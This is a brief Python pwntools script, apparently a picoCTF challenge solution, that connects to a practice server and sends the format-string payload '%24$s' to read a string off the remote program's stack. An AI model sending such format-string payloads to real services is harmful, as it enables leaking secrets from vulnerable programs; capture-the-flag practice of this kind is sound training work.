from pwn import *

p = remote("saturn.picoctf.net", 61218)



payload = b"%24$s"
p.sendline(payload)



s = p.recvall().decode('latin-1')
print(s)
